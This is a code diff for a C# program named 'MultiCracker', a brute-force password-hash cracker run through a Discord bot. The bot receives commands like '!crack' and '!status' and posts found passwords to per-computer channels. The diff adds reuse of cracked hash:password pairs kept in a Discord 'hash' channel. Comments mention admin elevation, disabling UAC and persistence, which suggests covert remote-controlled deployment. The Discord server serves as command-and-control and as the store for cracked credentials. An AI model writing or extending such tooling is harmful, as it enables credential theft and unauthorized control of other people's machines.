@@ -44,6 +44,9 @@ namespace MultiCracker
         // DONE: Add a way to elevate to admin.
         // Disable UAC.
         // DONE: Add a way to uninstall persistence.
+        // Save settings to profiles. (file)
+        // DONE: Save passwords and hashes to seperate channels to be used later.
+        // DONE: Add a way to load passwords and hashes from seperate channels.
         // ----------------------------------------
 
         bool EmergencySTOP = false;
@@ -258,6 +261,8 @@ namespace MultiCracker
                 // CRACKING
                 else if (trimmedContent == "!crack")
                 {
+                    counter = 0;
+                    stopwatch.Reset();
                     // Simulate a button press of btnStartCracking
                     btnStartCracking_Click(null, null);
                     await message.Channel.SendMessageAsync("Cracking started... Use **!status** it see its progress!");
@@ -333,7 +338,7 @@ namespace MultiCracker
 
                     Log(new LogMessage(LogSeverity.Info, "Password", $"Min length set to: {minLength}"));
                 }
-                else if (trimmedContent == "!status")
+                else if (trimmedContent == "!status" || trimmedContent == "!s")
                 {
                     if (counter > 0)
                     {
@@ -1790,6 +1795,38 @@ namespace MultiCracker
             FoundCorrectPass = false;
             EmergencySTOP = false;
 
+            // Variables
+            string computerNameRaw = "";
+            string computerName = "";
+
+            // Search for channel "hash" in the same guild and look though all messages
+            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"hash");
+            var messages = channel.GetMessagesAsync(100).FlattenAsync().Result;
+            List<IMessage> messageList = messages.ToList();
+
+            // Loop though all messages
+            foreach (var message in messageList)
+            {
+                // Check if the message starts with the target hash
+                if (message.Content.StartsWith(txtTargetHash.Text))
+                {
+                    // The message starts with the target hash
+                    // Stop cracking
+                    FoundCorrectPass = true;
+                    // Split with : and get the password
+                    finalPassword = message.Content.Split(":")[1];
+                    Log(new LogMessage(LogSeverity.Info, "Cracking", "Password found in storage! (" + txtTargetHash.Text + ":" + finalPassword + ")"));
+                    // Send message to channel "bot-<computername>"
+                    computerNameRaw = Environment.MachineName;
+                    computerName = computerNameRaw.ToLower();
+                    var channelBot = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
+                    await channelBot.SendMessageAsync($"@everyone **Password found in storage!** {txtTargetHash.Text}:{finalPassword}");
+                    return;
+                }
+            }
+
+            // Start stopwatch
             stopwatch.Start();
 
             foreach (var password in GeneratePasswords(MinLength, MaxLength, UseLetters, UseNumbers, UseCapitals, UseSymbols))
@@ -1825,17 +1862,62 @@ namespace MultiCracker
             // Log
             Log(new LogMessage(LogSeverity.Info, "Cracking", "Cracking stopped."));
             // Send message to discord
-            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
-            string computerNameRaw = Environment.MachineName;
-            string computerName = computerNameRaw.ToLower();
-            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
+            guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+            computerNameRaw = Environment.MachineName;
+            computerName = computerNameRaw.ToLower();
+            channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
             if (FoundCorrectPass)
             {
-                await channel.SendMessageAsync($"Password found! {txtGuessedPassword.Text}:{finalPassword}");
+                try
+                {
+                    TimeSpan timeElapsed = new TimeSpan();
+                    string formattedTimeElapsed = "";
+
+                    // Calculate time elapsed
+                    try
+                    {
+                        // Convert timeElapsed to a string that looks like this: 000D:00H:00M:00S:000F
+                        timeElapsed = stopwatch.Elapsed;
+
+                        // Calculate days, hours, minutes, seconds, and milliseconds
+                        BigInteger totalSeconds = (BigInteger)timeElapsed.TotalSeconds;
+                        BigInteger days = totalSeconds / (24 * 3600);
+                        BigInteger hours = totalSeconds / 3600;
+                        BigInteger remainingMinutes = totalSeconds % 3600;
+                        BigInteger minutes = remainingMinutes / 60;
+                        BigInteger seconds = remainingMinutes % 60;
+                        BigInteger milliseconds = (BigInteger)((stopwatch.Elapsed.TotalMilliseconds - Math.Floor(stopwatch.Elapsed.TotalMilliseconds)) * 1000);
+
+                        // Format the time
+                        formattedTimeElapsed = $"{days:D3}D:{hours:D2}H:{minutes:D2}M:{seconds:D2}S:{milliseconds:D3}F";
+
+                    }
+                    catch (Exception ex)
+                    {
+                        // Log error
+                        Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating time elapsed: {ex.Message}"));
+                    }
+
+                    await channel.SendMessageAsync($"@everyone **Password found! It only took {formattedTimeElapsed} to find the password!**");
+                    await channel.SendMessageAsync($"{txtGuessedPassword.Text}:{finalPassword}");
+
+                    // Activate function to send hash and password to discord channel "hash" in the same guild
+                    // Send message to discord
+                    var guild2 = _client.Guilds.FirstOrDefault(); // Get the first available guild
+                    var channel2 = guild2.TextChannels.FirstOrDefault(ch => ch.Name == $"hash");
+                    await channel2.SendMessageAsync($"{txtGuessedPassword.Text}:{finalPassword}");
+                }
+                catch (Exception ex)
+                {
+                    // Log error
+                    Log(new LogMessage(LogSeverity.Error, "Cracking", $"Error sending message to discord: {ex.Message}"));
+                    // Send message to discord
+                    await channel.SendMessageAsync($"@everyone **Password found! {txtGuessedPassword.Text}:{finalPassword}**");
+                }
             }
             else
             {
-                await channel.SendMessageAsync($"Password NOT found! {txtGuessedPassword.Text}:{finalPassword}");
+                await channel.SendMessageAsync($"@everyone Password NOT found! {txtGuessedPassword.Text}:{finalPassword}");
             }
             // If you want to use the target hash as the final password, you can do this:
             txtDonePassword.Text = finalPassword.ToString();
